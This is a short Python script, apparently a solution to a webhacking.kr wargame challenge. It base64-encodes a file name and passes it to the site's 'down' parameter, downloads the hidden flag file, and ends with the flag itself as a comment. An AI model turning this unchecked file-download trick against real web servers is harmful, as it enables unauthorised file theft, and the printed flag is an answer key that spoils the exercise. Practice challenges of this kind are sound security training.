import requests
import base64

url = 'https://webhacking.kr/challenge/web-20/index.php?down='
fn = base64.b64encode(b'flag.docx')

response = requests.get(url+fn.decode())
open('flag.docx', 'wb').write(response.content)
print('written to ./flag.docx')

# FLAG{very_difficult_to_think_up_text_of_the_flag}

